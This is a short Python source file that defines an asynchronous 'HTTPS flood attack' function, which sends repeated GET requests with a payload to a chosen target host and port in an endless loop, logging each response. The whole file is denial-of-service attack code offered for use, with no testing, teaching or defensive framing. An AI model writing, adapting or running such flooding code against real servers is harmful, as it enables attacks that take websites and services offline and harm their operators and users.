import asyncio
import aiohttp
import logging
import socket
import time

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


# Asynchronous function to send HTTPS flood attack
async def send_async_https_flood(target, port, payload, interval):
    url = f"https://{target}:{port}"
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(url, data=payload) as response:
                    logging.info(f"🔒 HTTPS Flood Response: {response.status}")
            except Exception as e:
                logging.error(f"HTTPS Flood Error: {e}")
                break  # Exit the loop on error
            await asyncio.sleep(interval)